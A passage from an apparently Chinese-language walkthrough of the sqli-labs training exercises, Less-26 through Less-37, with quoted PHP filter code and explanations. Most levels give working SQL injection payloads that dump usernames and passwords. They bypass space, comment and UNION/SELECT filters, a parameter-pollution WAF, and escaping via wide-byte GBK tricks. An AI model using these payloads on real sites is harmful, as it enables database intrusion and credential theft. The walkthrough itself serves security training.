<kbd>%00</kbd> 来在 PHP 中截断，不难发现 <kbd>;%00</kbd> 实际上就等效于注释符。因此将上述 <kbd>payload</kbd> 修改如下即可爆出 <kbd>users</kbd> 表中的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union(select(1),(select(group_concat(concat_ws(&#x27;%7f~%7f&#x27;,id,username,passwoorrd)separatoorr&#x27;&lt;br&gt;&#x27;))from(users)),3);%00</span><br></pre></td></tr></table></figure><p>至于为何不能直接传入 <kbd>%00</kbd> 而不用分号，这是因为 <kbd>%00</kbd> 本身对于 MySQL 来说就是一个非法字符，因此有必要在其之前就让语句终止。</p></li><li><p>当然，根据副标题，本题的正规解法其实还是报错注入，笔者一直都是能联合就不报错，毕竟联合查询一把就能爆出整个表，实在是痛快，过瘾啊！不过这里还是得啰嗦一句报错注入，因为抛弃了 <kbd>union</kbd> 运算符后，就不必为使用括号绕过空格时引号闭合的问题担心了，末尾直接通过 <kbd>and</kbd> 或 <kbd>or</kbd> 运算符连接单引号都可以直接绕过注释。<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;||extractvalue(1,concat(&#x27;~&#x27;,(select(concat_ws(&#x27;%20 -%20 &#x27;,id,email_id))from(emails)where(id=1)),&#x27;~&#x27;))||&#x27;</span><br></pre></td></tr></table></figure><p>其中由于 <kbd>limit</kbd> 语句着实不太好用小括号绕过，因此这里换成了使用 <kbd>where</kbd> 语句判断 <kbd>id</kbd> 值得方式逐行爆数据。<psw>不过本题这样注入来获取 users 表的意义不大，毕竟……直接传入 ID 值得效果是一样的。</psw></p></li></ul><h3 id="Less-26a">Less-26a</h3><div class="note default flat"><p>GET - Blind based - All your SPACES and COMMENTS belong to us - String single quotes - Parenthesis</p></div><p>再次进入姊妹题，本题界面除了色号以外，还在提示图中为 SPACE 和 COMMENTS 加了单引号，根据副标题提示，题中的闭合符号应该又变了。</p><img src="https://bu.dusays.com/2022/11/14/637121aaaec33.webp" alt="" style="zoom:75%"><ul><li><p>经过测试，本题所屏蔽的内容与前一关一致，但是不会再显示报错信息，因此不能进行报错注入。但是因为依然会回显用户名密码，因此联合注入依然成立，不过在此之前还是应该判断闭合符号。判断方法当然是沿用 <a href="#Less-1">Less-1</a> 就开始使用的老方法，只不过由于注释符被屏蔽，因此需要使用 <kbd>;%00</kbd> 来替换。最终通过如下两个 <kbd>payload</kbd> 的表现即可确定本题闭合符号为单引号加一个小括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;%00</span><br><span class="line">?id=1&#x27;);%00</span><br></pre></td></tr></table></figure></li><li><p>确认闭合符号后直接修改前一关联合注入的 <kbd>payload</kbd> 即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)union(select(1),(select(group_concat(concat_ws(&#x27;%7f~%7f&#x27;,id,username,passwoorrd)separatoorr&#x27;&lt;br&gt;&#x27;))from(users)),3);%00</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-27">Less-27</h3><div class="note default flat"><p>GET - Error based - All your UNION &amp; SELECT Belong to us - String - Single quotes</p></div><p>本题界面在此换了提示图，强调其过滤了 UNION 与 SELECT。</p><img src="https://bu.dusays.com/2022/11/14/637121aaaf3a1.webp" alt="" style="zoom:75%"><ul><li><p>稍作测试可以发现本题依然过滤了空格与注释符，增加了对于 UNION 与 SELECT 的过滤，但是并没有对 <kbd>and</kbd> 与 <kbd>or</kbd> 作过滤。为了便于分析，这里列出本题过滤部分的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 过滤 /* --  #</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤空格</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格过滤 select，即不能双写绕过</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再次过滤空格</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤 select 和 union 的全小写、全大写与首字母大写版本，即依然可以大小写绕过</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure><p>可以发现程序过滤的空格仅仅是空格这个字符而已，所以可以轻易绕过，而对于 UNION 的过滤也仅限于全小写、全大写与首字母大写版本，不过对于 SELECT 的过滤在此基础上还增加了全小写的多行匹配（<kbd>m</kbd>），因此 <kbd>select</kbd> 并不能使用双写绕过。此外，本题可以回显报错，因此依然可以报错注入，同时确认闭合符号为单引号。当然，我选联合注入。</p><img src="https://bu.dusays.com/2022/11/14/637121aab19fe.webp" alt="" style="zoom:75%"></li><li><p>虽然上述匹配规则非常多，但是显然大小写即可绕过对于 UNION 与 SELECT，并且 UNION 还能使用双写绕过。那么现在就可以非常容易地绕过了，如下 <kbd>payload</kbd>，直接使用 <kbd>%09</kbd> 水平定位符绕过空格，大小写绕过 <kbd>select</kbd>，双写绕过 <kbd>union</kbd>，十分顺滑 <kbd>users</kbd> 表就全体出来了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;uniunionon%09selEct%091,(seleCt(group_concat(concat_ws(&#x27;%09~%09&#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from%09users),3&#x27;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-27a">Less-27a</h3><div class="note default flat"><p>GET - Blind based - All your UNION and SELECT Belong to us - Double quotes</p></div><p>再次姊妹题，再次改了色号并在提示图中添加了单引号。</p><img src="https://bu.dusays.com/2022/11/14/637121aab69a3.webp" alt="" style="zoom:75%"><ul><li><p>稍作测试或者不作测试可知，本题过滤项并没有修改，但是回显报错还是被取消了，因此还是需要手动判断注释符才可进入下一步，由以下两个 <kbd>payload</kbd> 可知闭合符号仅为双引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;</span><br><span class="line">?id=1&quot;;%00</span><br></pre></td></tr></table></figure></li><li><p>然后直接修改上一题的 <kbd>payload</kbd> 即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;uniunionon%09selEct%091,(seleCt(group_concat(concat_ws(&#x27;%09~%09&#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from%09users),3&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-28">Less-28</h3><div class="note default flat"><p>GET - Error based - All your UNION &amp; SELECT Belong to us - String - Single quote with parnthesis</p></div><p>本题过滤的主角依然是 UNION 与 SELECT。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fc4d01.webp" alt="" style="zoom:75%"><ul><li><p>测试本题依然可以回显用户名密码，但是不能回显报错。此外，单独的 UNION 与 SELECT 都不会被过滤，只有连在一起使用时才会被过滤，过滤部分的源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 过滤注释符</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤空格</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤 union[空白字符]select 形式的序列，且匹配大小写，即该处不能使用大小写绕过</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>可以看出相较前一关，本题针对性过滤了 <kbd>union</kbd> 运算符的使用，但是双写或者在适宜环境下替换空白字符为 <kbd>%A0</kbd> 等便可以绕过。</p></li><li><p>没有报错的话就有需要手工确认闭合符号了，因为过滤了注释符，所以依然需要使用 <kbd>;%00</kbd> 来替代，由如下两个 <kbd>payload</kbd> 的回显反应即可值得闭合符号为单引号加小括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;%00</span><br><span class="line">?id=1&#x27;);%00</span><br></pre></td></tr></table></figure></li><li><p>然后就可以编写如下 <kbd>payload</kbd> 了，其中空格使用 <kbd>%09</kbd> 代替，而 <kbd>union%09select</kbd> 则需要整段双写，值得注意的是因为小括号的存在所以尾部使用闭合绕过需要使用 <kbd>and</kbd> 或 <kbd>or</kbd> 来连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)union%09union%09selectselect%091,(select(group_concat(concat_ws(&#x27;%09~%09&#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from%09users),3%09and(&#x27;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-28a">Less-28a</h3><div class="note default flat"><p>GET - Blind based - All your UNION &amp; SELECT Belong to us - Single quote - parnthesis</p></div><p>最后一次进入姊妹题，主角依然是 UNION 和 SELECT。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fcf459.webp" alt="" style="zoom:75%"><ul><li><p>本题依然会回显用户名密码，也不会报错，可以很轻易地发现本题闭合符号也没变，依旧是单引号加小括号地形式。不过，本题仅留下了如下的一句过滤语句，即现在空格和注释符均可以正常使用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	</span><br></pre></td></tr></table></figure></li><li><p>那么上一题的 <kbd>payload</kbd> 便依然适用了，不过为了美观，这里留个空格和注释回归的 <kbd>payload</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)union union selectselect 1,(select(group_concat(concat_ws(&#x27; ~ &#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-29">Less-29</h3><div class="note default flat"><p>GET - Error based - IMPIDENCE MISMATCH - Having a WAF in front of web application</p></div><p>本题不再提示过滤字符，但是加了防火墙。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fce0f1.webp" alt="" style="zoom:75%"><ul><li><p>正常传入 ID 会回显用户名和密码，浏览器可以回显报错，而且，实测主页直接进行联合注入便可注入成功，没有任何过滤，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union select 1,(select(group_concat(concat_ws(&#x27; ~ &#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from users),3--+</span><br></pre></td></tr></table></figure></li><li><p>虽然主页面很容易就过去了，但是查看源码可发现，考点实际上位于另一个文件 <kbd>login.php</kbd> 中，该文件与首页大体相比除了底部加了两个 <kbd>pdf</kbd> 外链以外，还作了如下修改，主要添加了两个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">whitelist(<span class="variable">$id1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 只匹配纯数字</span></span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">        <span class="comment">// 匹配失败则跳转到 hacked.php 文件，一个提示并带有返回连接的简单页面</span></span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">    <span class="comment">// 以 &amp; 为界将数据分隔</span></span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">// 取前两个字符判断传入数据是否为 id</span></span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="comment">// 符合则将数据返回</span></span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计代码会发现，<kbd>whitelist()</kbd> 函数会判断数据是否为纯数字，其配合 <kbd>java_implimentation()</kbd> 使用，而这个函数会将变量 <kbd>id</kbd> 的值返回。值得注意的是，如果传入数据的形式为 <kbd>?id=1&id=2</kbd> 时，将只能返回数据为 <kbd>1</kbd>，也就是说，这两个函数仅能判断两个相同变量的前者。有意思的是，Apache 只会接受后者，因此直接将 <kbd>payload</kbd> 放在最后传入即可，不会受到任何检测与过滤。</p></li><li><p>所以依然是普通的 <kbd>payload</kbd>，只是位置不同而已，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&#x27;union select 1,(select(group_concat(concat_ws(&#x27; ~ &#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from users),3--+</span><br></pre></td></tr></table></figure><p>小提一嘴，此处并非只是出一道简单题而已，而是模拟真实情况中 Tomcat 防火墙服务器加 Apache 网站服务器环境下，由于 Tomcat 对于相同参数只解析第一个而 Apache 只解析最后一个而造成的漏洞。</p></li><li><p>此外，由于本题 <kbd>java_implimentation()</kbd> 函数截取数据时只截取了 <kbd>30</kbd> 个字符，因此本题其实还可以这样解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=123456789123456789123456789000&#x27;union select 1,(select(group_concat(concat_ws(&#x27; ~ &#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-30">Less-30</h3><div class="note default flat"><p>GET - BLIND - IMPIDENCE MISMATCH - Having a WAF in front of web application</p></div><p>依然是防火墙的题目。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fd20f3.webp" alt="" style="zoom:75%"><ul><li><p>考点还是放在了 <kbd>login.php</kbd> 文件中，所以首页还是简单的联合注入即可，不过闭合符合换成了双引号，此处不多赘述。从 <kbd>login.php</kbd> 文件的注入也与前一关一致，根据回显的报错信息可以判断闭合符号同样换成了双引号，此处留一个 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;union select 1,(select(group_concat(concat_ws(&#x27; ~ &#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-31">Less-31</h3><div class="note default flat"><p>GET - BLIND - IMPIDENCE MISMATCH - Having a WAF in front of web application</p></div><p>还是防火墙，这次副标题都没有变。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fd49f1.webp" alt="" style="zoom:75%"><ul><li><p>同样首页是普通题，考点位于 <kbd>login.php</kbd> 文件，唯一的变化还是闭合符号改成了双引号加小括号，此处留个 <kbd>payload</kbd>，不多赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;)union select 1,(select(group_concat(concat_ws(&#x27; ~ &#x27;,id,username,password)separator&#x27;&lt;br&gt;&#x27;))from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-32">Less-32</h3><div class="note default flat"><p>GET - Bypass custom filter adding slashes to dangerous chars</p></div><p>防火墙暂时就过去了，新页面一如既往，不过底部增加了两行数据。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fd54ed.webp" alt="" style="zoom:75%"><ul><li><p>测试发现，后台会将特殊字符转义，底部两行数据则分别回显用户转义后成功注入的数据以及其十六进制序列。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fd6c73.webp" alt="" style="zoom:75%"></li><li><p>这时候就有必要用到宽字节注入了，原理是在使用 GBK 编码时，汉字是占用两个字节的。程序在引号与转义符号前加上转义符号，而在这之前若存在可与被加的转义符连成一个汉字的码值，那就等于没被转义了，也就绕过了！值得注意的是汉字 GBK 编码范围为 <strong>8140－FEFE</strong>，即第一个字节一直大于等于 <kbd>0x81</kbd>，而普通 Ascii 字符均小于 <kbd>%7F</kbd>，所以不必担心程序认不出来。</p></li><li><p>当然此前的 <kbd>payload</kbd> 并非每个单引号都可以这样绕过，那些为爆出的数据用作分隔符而存在的单引号使用宽字节就会导致语法错误，所幸只表示字符数据的话可以直接使用十六进制序列而不需要单引号。因此本题 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%81&#x27;union select 1,(select(group_concat(concat_ws(0x207e20,id,username,password)separator 0x3c62723e))from users),3--+</span><br></pre></td></tr></table></figure><p>其中，单引号码值为 <kbd>0x27</kbd>，与笔者使用的 <kbd>0x81</kbd> 连接后的码值并不在 GBK 汉字编码的范围内。这是一个特殊范例，笔者借此说明该解法的重点是宽字节，而并非汉字。不过实际上还是放在汉字编码范围内比较稳妥，比如使用 <kbd>0x80</kbd> 和 <kbd>0xFF</kbd> 时便不会被解析为宽字节。</p></li></ul><h3 id="Less-33">Less-33</h3><div class="note default flat"><p>GET - Bypass AddSlashes()</p></div><p>小变了一个色号，此外并无改变。</p><img src="https://bu.dusays.com/2022/11/16/6373b96fd9ac6.webp" alt="" style="zoom:75%"><ul><li>经过测试，本题同样将引号与转义符号给转义了，甚至可以说是两题一模一样。不过由副标题可知，本题使用的是 <kbd>addslashes()</kbd> 函数，该函数功能为将预定义符号转义，其中预定义的符号有单双引号、转义符以及 NULL。也就是说，果然还是可以跟上一题一样，实测上一题的 <kbd>payload</kbd> 就可以绕过，此处不做赘述。</li></ul><h3 id="Less-34">Less-34</h3><div class="note default flat"><p>POST - Bypass AddSlashes()</p></div><p>POST 限时返场！</p><img src="https://bu.dusays.com/2022/11/16/6373b96fb8c04.webp" alt="" style="zoom:75%"><ul><li><p>虽然换成了 POST 方法，但是其仍然只是将引号与转义符给转义了，由副标题可知是使用 <kbd>addslashes()</kbd> 函数完成的。所以与前文一样使用宽字节绕过即可，不过既然是 POST，自然就无法像 URL 一样直接使用百分号加编码就行，毕竟人家是正儿八经的数据，百分号就是百分号而已，后面会用 <kbd>%25</kbd> 来替换掉的。所以我们需要一个满足条件的字符来完成绕过，这个时候全角符号就排上用场了。比如人民币的符号 <kbd>￥</kbd>，相当于 URL 中的编码 <kbd>%EF%BF%A5</kbd>，占用三个字节，在解析为 GBK 编码时，前两个字节就组成了一个汉字，而最后一个大小也很符合，可以与后面的转义字符结合成一个汉字，完美绕过。</p></li><li><p>所以在用户名处输入如下 <kbd>payload</kbd> 密码随意，就可爆出数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">￥&#x27;union select 1,(select(group_concat(concat_ws(0x207e20,id,username,password)separator 0x3c62723e))from users)#</span><br></pre></td></tr></table></figure><p>值得注意的是，本题的后台 SQL 语句仅查询了用户名和密码两个字段的数据，因此联合查询的时候只能查询两个字段。</p></li><li><p>当然，直接抓包将 <kbd>%81</kbd> 放上去也是可以的，完整 <kbd>payload</kbd> 如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%81%27union+select+1%2C%28select%28group_concat%28concat_ws%280x207e20%2Cid%2Cusername%2Cpassword%29separator+0x3c62723e%29%29from+users%29%23&amp;passwd=%C2%B7&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>显然这样还是不够优雅。</p></li></ul><h3 id="Less-35">Less-35</h3><div class="note default flat"><p>GET - Bypass Add Slashes (we dont need them) Integer based</p></div><p>再次回到 GET 方法，底部变成了一行，也就是不回显十六进制码值了。</p><img src="https://bu.dusays.com/2022/11/17/637646bede93b.webp" alt="" style="zoom:75%"><ul><li><p>本题与此前一样，都是会对特殊字符进行转义，不过，由以下 <kbd>payload</kbd> 可知该注入点为数字型注入，因此我们甚至可以不用引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2</span><br><span class="line">?id=1 and 1=1</span><br></pre></td></tr></table></figure></li><li><p>所以就可以使用如下 <kbd>payload</kbd> 爆出数据，其中作为分隔符的部分依然使用十六进制序列来代替。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,(select group_concat(concat_ws(0x207e20,id,username,password) separator 0x3c62723e) from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-36">Less-36</h3><div class="note default flat"><p>GET - Bypass MySQL_real_escape_string</p></div><p>底部十六进制序列的回显再次回归。</p><img src="https://bu.dusays.com/2022/11/17/637646beeeed6.webp" alt="" style="zoom:75%"><ul><li><p>本题依旧会对特殊符号进行转义，由副标题提示本题应该使用的是 <kbd>MySQL_real_escape_string</kbd> 对数据进行转义操作，该函数除了会对引号与转义符进行转义以外，还会换行回车以及 NULL 等字符进行转义，不过其中并不包括空格，因此对于我们来说效果与此前关卡一致。因为闭关符号也为单引号，所以本题依然可以使用 <a href="#Less-32">Less-32</a> 的 <kbd>payload</kbd>，这里留一个使用全角字符 <kbd>￥</kbd> 来绕过的 <kbd>payload</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0￥&#x27;union select 1,(select(group_concat(concat_ws(0x207e20,id,username,password)separator 0x3c62723e))from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-37">Less-37</h3><div class="note default flat"><p>POST - Bypass MySQL_real_escape_string</p></div><p>该板块的最后一题，配色突然悲惨了起来。从副标题来看，本题应该只是改变了数据的获取方式。</p><img src="https://bu.dusays.com/2022/11/17/637646beeb870.webp" alt="" style="zoom:75%"><ul><li>实测确实还是转义了特殊符号，根据前一题可知本题还是可以使用 <a href="#Less-34">Less-34</a> 的解法，<kbd>payload</kbd> 不需任何更改，故此处不再赘述。</li></ul><h2 id="堆叠注入">堆叠注入</h2><h3 id="Less-38">Less-38</h3><div class="note default flat"><p>GET - Stacked Query Injection - String</p></div><p>进入堆叠注入时代！第一题就回到了简单的 GET 页面。</p><img src="https://bu.dusays.com/2022/11/17/637646bef2299.webp" alt="" 